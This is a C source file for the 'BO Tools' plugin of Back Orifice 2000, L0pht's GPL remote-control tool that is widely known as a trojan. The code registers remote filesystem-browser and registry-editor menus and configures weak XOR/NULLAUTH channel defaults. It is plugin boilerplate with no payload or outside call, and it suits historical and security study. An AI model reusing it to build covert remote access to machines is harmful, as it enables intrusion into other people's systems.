/*  BOTOOL - Back Orifice 2000 File System and Registry Browser/Editor
    Copyright (C) 1999, L0pht Heavy Industries, Inc.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<plugins.h>
#include<bocomreg.h>
#include<iohandler.h>
#include<encryption.h>
#include"botool.h"
#include"explore.h"
#include"regedit.h"
#include"commnet.h"

// ---------------- Global Linkage Variables -----------------
CEncryptionHandler				*g_pEncHandler=NULL;
CIOHandler						*g_pIOHandler=NULL;
TYPEOF_RegisterCommand			*RegisterCommand=NULL;
TYPEOF_UnregisterCommand		*UnregisterCommand=NULL;
TYPEOF_RegisterClientMenu		*RegisterClientMenu=NULL;
TYPEOF_UnregisterClientMenu		*UnregisterClientMenu=NULL;
TYPEOF_IssueAuthCommandRequest	*IssueAuthCommandRequest=NULL;
TYPEOF_IssueAuthCommandReply	*IssueAuthCommandReply=NULL;
TYPEOF_ConnectAuthSocket		*ConnectAuthSocket=NULL;
TYPEOF_ListenAuthSocket			*ListenAuthSocket=NULL;
TYPEOF_InteractiveConnect		*InteractiveConnect=NULL;
TYPEOF_InteractiveListen		*InteractiveListen=NULL;

#pragma comment(linker,"/section:.rdata,RW")
#pragma comment(linker,"/section:.data,RW")

// ------------- Function Implementations ------------------

HINSTANCE g_hInstance;
BOOL g_bActive;
long g_nNumThreads;
char g_szToolOptions[]="<**CFG**>BO Tools\0"
						   "S[8]:File Xfer Net Module=TCPIO\0\0\0\0"
                           "S[8]:File Xfer Enc=XOR\0\0\0\0\0\0"
						   "S[8]:File Xfer Auth=NULLAUTH\0"
						   "S[8]:Cmd Channel Net Module=TCPIO\0\0\0\0"
                           "S[8]:Cmd Channel Enc=XOR\0\0\0\0\0\0"
						   "S[8]:Cmd Channel Auth=NULLAUTH\0";
						   

BOOL WINAPI DllMain(HINSTANCE hInst, ULONG ul_reason_for_call, LPVOID lpReserved)
{
	// Do NOT perform configuration or initialization here

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		g_hInstance=hInst;
		break;
	}
	return TRUE;
}

BOOL InstallPlugin(PLUGIN_LINKAGE pl)
{
	
	g_bActive=TRUE;
	g_nNumThreads=0;

	g_pEncHandler=pl.pEncryptionHandler;
	g_pIOHandler=pl.pIOHandler;
	RegisterCommand=pl.pRegisterCommand;
	UnregisterCommand=pl.pUnregisterCommand;
	IssueAuthCommandRequest=pl.pIssueAuthCommandRequest;
	IssueAuthCommandReply=pl.pIssueAuthCommandReply;
	ConnectAuthSocket=pl.pConnectAuthSocket;
	ListenAuthSocket=pl.pListenAuthSocket;
	RegisterClientMenu=pl.pRegisterClientMenu;
	UnregisterClientMenu=pl.pUnregisterClientMenu;
	InteractiveListen=pl.pInteractiveListen;
	InteractiveConnect=pl.pInteractiveConnect;
	
	if(RegisterClientMenu) {
		RegisterClientMenu("BO Tools","Filesystem Browser",CreateExploreClient);
		RegisterClientMenu("BO Tools","Remote Registry",CreateRegeditClient);
	}

	return TRUE;
}

void TerminatePlugin(void)
{
	g_bActive=FALSE;
	while(g_nNumThreads>0) Sleep(0);

	if(UnregisterClientMenu) {
		UnregisterClientMenu("BO Tools","Remote Registry");
		UnregisterClientMenu("BO Tools","Filesystem Browser");
	}
}


BOOL PluginVersion(PLUGIN_VERSION *ppv)
{
	ppv->svFilename="botool.dll";
	ppv->svDescription="BO2K System Tools";
	ppv->wVersionHi=1;
	ppv->wVersionLo=0;
	ppv->wBOVersionHi=1;
	ppv->wBOVersionLo=0;

	return TRUE;
}

void BreakDownCommand(BYTE *pInBuffer, int *cmdlen, int *command, int *comid, int *nArg1, char **svArg2, char **svArg3)
{
	struct bo_command_header *hdr;
	
	hdr=(struct bo_command_header *)pInBuffer;

	*cmdlen=hdr->cmdlen;
	*command=hdr->command;
	*comid=hdr->comid;
	*nArg1=hdr->nArg1;
	if(hdr->nArg2Len>0) {
		*svArg2=(char *)(pInBuffer+sizeof(struct bo_command_header));
	} else *svArg2=NULL;
	if(hdr->nArg3Len>0) {
		*svArg3=(char *)(pInBuffer+sizeof(struct bo_command_header)+hdr->nArg2Len);
	} else *svArg3=NULL;
}
